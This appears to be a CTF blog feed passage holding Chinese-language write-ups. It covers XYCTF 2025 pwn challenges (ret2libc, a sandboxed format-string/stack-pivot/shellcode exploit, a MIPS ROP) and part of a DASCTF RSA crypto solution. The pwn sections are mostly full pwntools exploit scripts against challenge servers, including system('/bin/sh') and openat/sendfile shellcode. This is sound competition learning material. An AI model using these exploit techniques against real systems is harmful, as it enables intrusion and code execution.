p64(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(b&#x27;1&#x27;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x220</span>-<span class="number">0x4</span>) +<span class="string">b&#x27;\x28&#x27;</span> + p64(<span class="number">0x40128D</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;&quot;&quot;b *0x401261&quot;&quot;&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Ret2libc\&#x27;s Revenge\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak----&gt;&#x27;</span>,puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr----&gt;&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x2a3e5</span></span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x220</span>-<span class="number">0x4</span>) +<span class="string">b&#x27;\x28&#x27;</span> + p64(pop_rdi) + p64(sh)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li>得到flag：</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250405182442679.png" alt="image-20250405182442679"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;5f98f505-<span class="number">5509</span>-<span class="number">4968</span>-a91d-7c43782fe067&#125;</span><br></pre></td></tr></table></figure><h2 id="girlfriend"><a class="markdownIt-Anchor" href="#girlfriend"></a> girlfriend</h2><ul><li>查看附件发现保护全开</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250406151906419.png" alt="image-20250406151906419"></p><ul><li>接下来就反翻译该程序<code>main</code>函数如下：</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250406151942590.png" alt="image-20250406151942590"></p><ul><li>这时我们发现了该程序还加了沙箱</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250406152003724.png" alt="image-20250406152003724"></p><ul><li>查看一下沙箱禁用规则，发现open禁了，我们可以使用<code>openat</code>，然后<code>read</code>只允许标注输入流输入。<code>execve</code>也被禁了</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250406152026205.png" alt="image-20250406152026205"></p><ul><li>然后查看一下程序是否有其他漏洞。发现在函数<code>GirlFriend()</code>这边存在一个栈溢出，但是溢出的字节数很小，需要使用栈迁移</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250406152213913.png" alt="image-20250406152213913"></p><ul><li>然后还发现<code>Reply()</code>函数这边存在字符串格式化漏洞</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250406152243216.png" alt="image-20250406152243216"></p><ul><li>这时我们的思路就是如下：<ul><li>先进行选择<code>3</code>利用字符串格式化漏洞泄露栈地址，泄露libc地址，泄露程序的地址</li><li>然后使用栈迁移构造<code>rop</code>链，这次栈迁移选择迁移到栈上构造rop链，然后通过调用<code>mprotece</code>函数将<code>bss</code>段的权限改为可读可写可执行</li><li>之后返回到<code>main</code>函数的开头，让程序重头开始运行</li><li>之后还需要调用选择<code>3</code>，选择<code>3</code>的read也存在溢出，这样我们就可以修改选择一的<code>flag</code>标志位</li><li>接下去调用选择<code>1</code>这次就是栈迁移到bss段上，写shellcode</li><li>本次使用的是<code>openat</code>和<code>sendfile</code>这俩个系统调用</li></ul></li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250406152757516.png" alt="image-20250406152757516"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./girlfriend&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.94.172.18&#x27;</span>,<span class="number">24720</span>)</span><br><span class="line">rop = ROP(libc)</span><br><span class="line">pop_rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">pop_rsi = rop.find_gadget([<span class="string">&#x27;pop rsi&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">pop_rdx_rbx = <span class="number">0x904a9</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%6$p,%7$p,%37$p,%15$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;your name:\n&#x27;</span>)</span><br><span class="line">addrs = p.recvline()[:-<span class="number">1</span>].split(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak---&gt;&#x27;</span>,addrs)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(addrs[<span class="number">0</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(addrs[<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(addrs[<span class="number">2</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(addrs[<span class="number">3</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_addr--&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">base_addr = leak_addr - <span class="number">0x18D9</span></span><br><span class="line">libc_addr = libc_addr - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">128</span></span><br><span class="line">pop_rdi = libc_addr+pop_rdi</span><br><span class="line">pop_rdx_rbx = libc_addr+pop_rdx_rbx</span><br><span class="line">pop_rsi = libc_addr+pop_rsi</span><br><span class="line">mpro = libc_addr + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">stack = stack_addr+<span class="number">0x30</span>  <span class="comment">#0x4020+0x500+0x400</span></span><br><span class="line">bss_addr = base_addr+<span class="number">0x4020</span>+<span class="number">0x400</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x46</span> + p64(canary) + p64(stack) + p64(base_addr+<span class="number">0x1623</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdx_rbx) + p64(<span class="number">0x7</span>) + p64(canary) </span><br><span class="line">payload += p64(pop_rdi) + p64(base_addr+<span class="number">0x4000</span>) </span><br><span class="line">payload += p64(mpro) + p64(base_addr+<span class="number">0x1817</span>) +p64(canary)+ p64(stack-<span class="number">0x48</span>) + p64(base_addr+<span class="number">0x1676</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">0x9</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcraft.read(0,bss_addr+0x100,0x100)</span></span><br><span class="line">shellcode1 = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rsi,&#123;&#125;</span></span><br><span class="line"><span class="string">add rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(bss_addr+<span class="number">0x100</span>))</span><br><span class="line">shellcode1+= asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov r8,rsi</span></span><br><span class="line"><span class="string">jmp r8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(bss_addr+<span class="number">0x100</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;shellcode1----&gt;&#x27;</span>,<span class="built_in">len</span>(shellcode1))</span><br><span class="line">shellcode = asm(shellcraft.openat(-<span class="number">100</span>, <span class="string">&#x27;./flag&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">shellcode += asm(shellcraft.sendfile(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">50</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;len_shellcode---&gt;&#x27;</span>,<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + p64(bss_addr) + p64(base_addr+<span class="number">0x1623</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">payload = shellcode1+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>-<span class="built_in">len</span>(shellcode1))+p64(canary) + p64(bss_addr-<span class="number">0x40</span>)*<span class="number">0x2</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>最终得到flag</li></ul><p><img src="/2025/04/14/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025XYCTF-wp/image-20250406153253887.png" alt="image-20250406153253887"></p><ul><li>flag如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF&#123;cfd378d0-6ac7-414c-bc09-3db96beff92d&#125;</span><br></pre></td></tr></table></figure><h2 id="ez30"><a class="markdownIt-Anchor" href="#ez30"></a> EZ3.0</h2><ul><li>这题在这里就不多说了，放在<code>MIPS</code>架构下的<code>ROP</code>链中详细说明</li><li>并且这题是原题，照着<code>exp</code>打都能打出来。</li><li>所以这题直接就贴<code>exp</code>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;mips&#x27;</span></span><br><span class="line"><span class="comment">#p = process([&quot;qemu-mipsel&quot;, &quot;-L&quot;, &quot;/usr/mipsel-linux-gnu&quot;, &quot;./EZ3.0&quot;])</span></span><br><span class="line">p = remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20461</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">rop = <span class="number">0x00400a20</span></span><br><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">payload += p32(rop)</span><br><span class="line">payload += <span class="string">b&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(<span class="number">0x4009EC</span>)</span><br><span class="line">payload += p32(<span class="number">0x411010</span>)</span><br><span class="line">payload += p32(<span class="number">0x4009C8</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;&gt;&quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">总结：心态出问题,比赛牢不动pwn,跑去牢密码了,赛后复现一下PWN</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>DASCTF2024金秋十月复现</title>
    <link href="http://iyheart.github.io/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/"/>
    <id>http://iyheart.github.io/2025/04/02/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2024%E5%B9%B4/DASCTF2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-04-01T17:17:31.000Z</published>
    <updated>2025-04-03T08:33:08.757Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> CRYPTO</h1><h2 id="ez_rsa"><a class="markdownIt-Anchor" href="#ez_rsa"></a> ez_RSA</h2><ul><li>题目附件如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">num1 = getPrime(<span class="number">512</span>)</span><br><span class="line">num2 = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">while</span> num1&lt;num2 :</span><br><span class="line">    num2 = getPrime(<span class="number">512</span>)</span><br><span class="line">ring = RealField(<span class="number">1050</span>)</span><br><span class="line">num3 = ring(num1) /ring(num2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;num3=&quot;</span>,num3)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line">n2 = getPrime(<span class="number">512</span>) * getPrime(<span class="number">512</span>)</span><br><span class="line">e1 = randint(<span class="number">1000</span>,<span class="number">2000</span>)</span><br><span class="line">e2 = randint(<span class="number">1000</span>,<span class="number">2000</span>)</span><br><span class="line">c1 = <span class="built_in">pow</span>(p+num1,e1,n2)</span><br><span class="line">c2 = <span class="built_in">pow</span>(p+num2,e2,n2)</span><br><span class="line"></span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">leak1 = <span class="built_in">pow</span>(q+q1,<span class="number">2024</span>,n)</span><br><span class="line">leak2 = <span class="built_in">pow</span>(q1+<span class="number">2024</span>,q,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n2=&quot;</span>,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1=&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2=&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak1=&quot;</span>,leak1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak2=&quot;</span>,leak2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">num3= 1.36557212221826657073387899060669771982679822943621690677450888408226656788387273887547841291114809989272635809810564202247340711087479554863446719786359395466961253205133910506682801159622545780721946115442033391600881399634390008053822158098121985270501317972263356522400827768601773721146954464269212959784543085</span></span><br><span class="line"><span class="string">n= 85105083975491693151454182116844944807066048677068373328227644321539783064315677834754866742549592569194223084173286381150626593510265361114796714226058887906219454795525438819082646860141163940340082006344850825956811992304447978369108606993344902286569100146695092703383844402883938506877787042873586279543</span></span><br><span class="line"><span class="string">c= 8090472119640930864901421058741085326954308673260202542020919764880488559370287585797498390920330336595858609617432370825503480936376306766495089200286004922821787548265246289552343468177624634434613746605553770994437785042510225956023382347023663125411103947669109085411939772215657220674436476279268458980</span></span><br><span class="line"><span class="string">n2= 101642316595332652021348165259853423287787139517550249986161819826180514401858258316466101056877182367161299111697465439636861942636526396547011727147471566130633614685728563576613692851860684686033186826342178072882901576159305747639645374751566751967096281105148714033096611618024355982220235949274576036321</span></span><br><span class="line"><span class="string">e1= 1630</span></span><br><span class="line"><span class="string">e2= 1866</span></span><br><span class="line"><span class="string">c1= 8857135083997055103287497833179378469532619748945804429057682575070405217145941944821968708809563240261403711644389684947851643865895254406194464015430673347359589677809515117412321862622147634752091324365628790687343748145339949310696116239361890881096088375070083053010564890401663562726144984405628773323</span></span><br><span class="line"><span class="string">c2= 44531030636557714647477473185500183066851251320453194953972504422367649302810396344051696851757189817391648356459225688318373454949578822468293099948132700460437006478679492801335689493431764882835346904225119630026545592437198370606462285405519745361570058335573353886454277790277663038008240372746639859253</span></span><br><span class="line"><span class="string">leak1= 82301473255013183706458389946960254392188270550712533886416705365418418731488346328643954589202172816597173052792573628245245948345810581701878535280775967863966009605872386693838526935762655380705962833467046779524956212498594045378770790026387120339093736625186401934354434702063802537686761251873173518029</span></span><br><span class="line"><span class="string">leak2= 43580171648136008789232340619597144591536098696024883687397347933098380327258730482377138309020375265135558484586783368757872008322883985094403855691297725907800406097129735499961231236473313141257901326737291586051506797429883866846199683028143924054925109557329949641367848264351523500925115860458645738192</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>我们先来看第三部分，如果是解题为目的的话，只需要解这一部分就可以了，解这一部分即可得到<code>flag</code>。可以直接使用<code>gcd</code>得到。推导过程的话会一些同余的运算性质即可。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">leak1 = <span class="built_in">pow</span>(q+q1,<span class="number">2024</span>,n)</span><br><span class="line">leak2 = <span class="built_in">pow</span>(q1+<span class="number">2024</span>,q,n)</span><br></pre></td></tr></table></figure><ul><li><p>推导过程如下：</p></li><li><p>exp如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">leak1= <span class="number">82301473255013183706458389946960254392188270550712533886416705365418418731488346328643954589202172816597173052792573628245245948345810581701878535280775967863966009605872386693838526935762655380705962833467046779524956212498594045378770790026387120339093736625186401934354434702063802537686761251873173518029</span></span><br><span class="line">leak2= <span class="number">43580171648136008789232340619597144591536098696024883687397347933098380327258730482377138309020375265135558484586783368757872008322883985094403855691297725907800406097129735499961231236473313141257901326737291586051506797429883866846199683028143924054925109557329949641367848264351523500925115860458645738192</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c= <span class="number">8090472119640930864901421058741085326954308673260202542020919764880488559370287585797498390920330336595858609617432370825503480936376306766495089200286004922821787548265246289552343468177624634434613746605553770994437785042510225956023382347023663125411103947669109085411939772215657220674436476279268458980</span></span><br><span class="line">q = gmpy2.gcd(leak1-<span class="built_in">pow</span>(leak2-<span class="number">2024</span>,<span class="number">2024</span>,n),n)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">p = n//q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;c0ngr4tu1ati0n$_0n_$ucccc3$$1ng_1n!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>再来看第一部分，主要先来介绍一下<code>RealField()</code>：<ul><li><code>RealField()</code>是实现任意精度的浮点数，一般浮点数都是采用<code>IEEE754</code>标准，精度会有限制。而<code>RealField()</code>，是实现任意精度的浮点数，而代码中的设定了<code>1050</code>精度的浮点数。</li><li>在该精度下实现俩个素数相除，并且得到<code>1050</code>精度大小的小数。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num1 = getPrime(<span class="number">512</span>)</span><br><span class="line">num2 = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">while</span> num1&lt;num2 :</span><br><span class="line">    num2 = getPrime(<span class="number">512</span>)</span><br><span class="line">ring = RealField(<span class="number">1050</span>)</span><br><span class="line">num3 = ring(num1) /ring(num2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;num3=&quot;</span>,num3)</span><br><span class="line"></span><br><span class="line">num3= <span class="number">1.36557212221826657073387899060669771982679822943621690677450888408226656788387273887547841291114809989272635809810564202247340711087479554863446719786359395466961253205133910506682801159622545780721946115442033391600881399634390008053822158098121985270501317972263356522400827768601773721146954464269212959784543085</span></span><br></pre></td></tr></table></figure><ul><li>此时我们就要通过小数来还原<code>分子</code>和<code>分母</code>这俩个素数。而我们的小数可以使用连分数展开，展开之后我们可以将连分数化为正常的分数形式，这样俩个素数就已经还原回来了。</li><li>这时我们再检查一下这俩个素数是否正确就行了。用到的连分数相关的定理目前我还没具体了解，等了解后就贴出（先填一个坑）。</li><li>在<code>sagemath</code>中可以使用如下几个函数对小数进行转换：<ul><li><code>continued_fraction函数</code>：将一个小数转换成连分数的形式，返回的是一个类似于列表形式。</li><li><code>numerator方法</code>：这个方法是对返回的连分数进行操作，该方法是传递的参数是获取指定第<code>n</code>个收敛子对应的分子</li><li><code>denominator方法</code>：这个方法同<code>numberator</code>，但是它是获取指定第<code>n</code>个收敛子对应的分母。</li><li>但是我们并不知道要对应的是第几个收敛子的分子，所以我们要爆破和做判断从而解出<code>num1</code>和<code>num2</code></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">num3 = <span class="string">&quot;1.36557212221826657073387899060669771982679822943621690677450888408226656788387273887547841291114809989272635809810564202247340711087479554863446719786359395466961253205133910506682801159622545780721946115442033391600881399634390008053822158098121985270501317972263356522400827768601773721146954464269212959784543085&quot;</span></span><br><span class="line">result = RealField(<span class="number">1050</span>)(num3)</span><br><span class="line">cf = continued_fraction(result)</span><br><span class="line"><span class="built_in">print</span>(cf)</span><br><span class="line">num1 = cf.numerator(<span class="number">1050</span>)</span><br><span class="line">num2 = cf.denominator(<span class="number">1050</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1050</span>):</span><br><span class="line">    num1 = cf.numerator(i)</span><br><span class="line">    <span class="keyword">if</span> isPrime(num1) == <span class="literal">True</span> <span class="keyword">and</span> <span class="built_in">int</span>(num1).bit_length()==<span class="number">512</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1050</span>):</span><br><span class="line">    num2 = cf.denominator(i)</span><br><span class="line">    <span class="keyword">if</span> isPrime(num2) == <span class="literal">True</span> <span class="keyword">and</span> <span class="built_in">int</span>(num2).bit_length()==<span class="number">512</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(num1)</span><br><span 